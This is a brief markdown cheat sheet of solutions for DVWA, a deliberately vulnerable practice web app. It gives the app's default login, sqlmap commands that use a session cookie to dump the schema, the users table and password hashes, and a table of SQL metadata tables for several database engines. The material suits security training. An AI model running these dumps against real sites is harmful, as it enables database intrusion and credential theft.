
# the solutions of dvwa

## default login param

- `admin` , `password`

## table of content

- [the solutions of dvwa](#the-solutions-of-dvwa)
  - [default login param](#default-login-param)
  - [table of content](#table-of-content)
  - [sqlmap](#sqlmap)
  - [sql, meta tables](#sql-meta-tables)

## sqlmap

- basic usage

```sh
sqlmap -u "http://url/..." --cookie="A=1; b=2"
sqlmap -u "http://url/..." --cookie="A=1; b=2" --schema --batch
sqlmap -u "http://url/..." --cookie="A=1; b=2" --dump -T users --batch
sqlmap -u "http://url/..." --cookie="A=1; b=2" --passwords
```

## sql, meta tables

| Engine     | Table name         |
| ---------- | ------------------ |
| SQLite     | sqlite_master      |
| MySQL      | information_schema |
| PostgreSQL | information_schema |
| Oracle     | dba_tables         |
